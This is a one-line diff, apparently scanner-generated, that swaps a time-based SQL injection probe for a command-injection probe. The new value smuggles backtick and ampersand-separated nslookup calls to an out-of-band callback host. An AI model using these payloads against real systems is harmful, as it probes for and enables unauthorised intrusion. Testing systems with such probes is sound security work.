@@ -1,1 +1,1 @@
-555'||sleep(27*1000)*sbyifr||'
+&nslookup -q=cname hitiyvblszgdi912a1.bxss.me&'\"`0&nslookup -q=cname hitiyvblszgdi912a1.bxss.me&`'
